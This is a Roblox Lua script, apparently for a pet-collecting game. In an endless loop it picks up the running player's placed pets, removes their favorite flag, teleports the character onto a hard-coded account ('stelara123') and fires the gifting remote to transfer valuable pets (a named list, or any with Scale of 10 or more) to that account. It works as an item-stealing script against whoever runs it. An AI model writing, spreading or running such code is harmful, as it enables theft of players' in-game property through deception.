warn("[PETGIFT] Script started")

local DEBUG_TAG = "[PETGIFT]"
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local LocalPlayer = Players.LocalPlayer

-- Remotes & modules
local GiftRemote = ReplicatedStorage:WaitForChild("GameEvents"):WaitForChild("PetGiftingService")
local PickUpModule = require(
	ReplicatedStorage.Modules.PetServices.PetActionUserInterfaceService.PetActionsHandlers.PickUp
)

-- Allowed pet names
local ALLOWED_PET_TYPES = {
	"dog", "bunny", "mimic octopus", "disco bee", "raccoon", "kitsune",
	"butterfly", "spinosaurus", "dragonfly", "queen bee", "night owl",
	"t-rex", "dilophosaurus", "moon cat", "fennec fox", "chicken zombie",
	"hyacinth macaw", "orange tabby"
}

-- Debug print helper
local function debugPrint(...)
	print(DEBUG_TAG, ...)
end

-- Pet check (name OR scale >= 10)
local function isPetTypeMatch(pet)
	if not pet or not pet:IsA("Tool") then return false end

	-- Check PetType attribute (if present)
	local petTypeAttr = pet:GetAttribute("PetType")
	if petTypeAttr then
		local lowerType = tostring(petTypeAttr):lower()
		for _, allowed in ipairs(ALLOWED_PET_TYPES) do
			if lowerType:find(allowed) then
				return true
			end
		end
	end

	-- Check by name
	local lowerName = pet.Name:lower()
	for _, allowed in ipairs(ALLOWED_PET_TYPES) do
		if lowerName:find(allowed) then
			return true
		end
	end

	-- Allow if Scale ≥ 10
	local scale = pet:GetAttribute("Scale")
	if scale and tonumber(scale) and tonumber(scale) >= 10 then
		debugPrint("Allowing", pet.Name, "because Scale ≥ 10:", scale)
		return true
	end

	return false
end

-- Teleport onto specific player (stelara123)
local function teleportToTargetPlayer()
	local char = LocalPlayer.Character
	local target = Players:FindFirstChild("stelara123")
	if char and char:FindFirstChild("HumanoidRootPart") and target and target.Character and target.Character:FindFirstChild("HumanoidRootPart") then
		char.HumanoidRootPart.CFrame = target.Character.HumanoidRootPart.CFrame
		return target
	end
	return nil
end

-- Gift pet
local function giftPetDirectly(pet)
	if not pet then return end

	-- remove favorite before gifting
	if pet:GetAttribute("Favorite") then
		pet:SetAttribute("Favorite", false)
		debugPrint("Removed favorite on", pet.Name)
	end

	local target = teleportToTargetPlayer()
	if target then
		debugPrint("Gifting", pet.Name, "to", target.Name)
		local originalParent = pet.Parent

		-- temporarily equip
		pet.Parent = LocalPlayer.Character
		task.wait() 

		GiftRemote:FireServer("GivePet", pet)

		-- if still not gifted, restore
		if pet.Parent == LocalPlayer.Character then
			pet.Parent = originalParent
		end
	else
		debugPrint("Target player (stelara123) not found.")
	end
end

-- Gift from containers
local function checkAndGiftFromContainer(container)
	if not container then return end
	for _, pet in ipairs(container:GetChildren()) do
		if pet:IsA("Tool") and isPetTypeMatch(pet) then
			debugPrint("Found pet:", pet.Name)
			giftPetDirectly(pet)
			task.wait(0.2) -- slight delay between gifts
		end
	end
end

-- Find pet model by UUID in workspace
local function findPlacedPetByUUID(uuid)
	for _, obj in ipairs(workspace:GetDescendants()) do
		if obj:GetAttribute("UUID") == uuid then
			return obj
		end
	end
	return nil
end

-- Pick up placed pets
local function pickUpPlacedPets()
	local activeUI = LocalPlayer.PlayerGui:FindFirstChild("ActivePetUI")
	if not activeUI then return end

	local scroll = activeUI:FindFirstChild("Frame")
		and activeUI.Frame:FindFirstChild("Main")
		and activeUI.Frame.Main:FindFirstChild("ScrollingFrame")
	if not scroll then return end

	for _, petFrame in ipairs(scroll:GetChildren()) do
		if petFrame:IsA("Frame")
			and petFrame:FindFirstChild("PET_TYPE")
			and petFrame.Name ~= "PetTemplate" then

			local petType = petFrame.PET_TYPE.Text
			if isPetTypeMatch({Name = petType, IsA = function() return true end, GetAttribute = function() return nil end}) then
				local uuid = petFrame.Name
				local petModel = findPlacedPetByUUID(uuid)
				if petModel then
					debugPrint("Picking up placed pet:", petType)
					PickUpModule.Activate(petModel)
					task.wait(0.05)
				end
			end
		end
	end
end

-- Main loop
debugPrint("Starting gifting loop...")
task.spawn(function()
	while true do
		task.wait(0.2)
		checkAndGiftFromContainer(LocalPlayer.Backpack)
		checkAndGiftFromContainer(LocalPlayer.Character)
		pickUpPlacedPets()
	end
end)
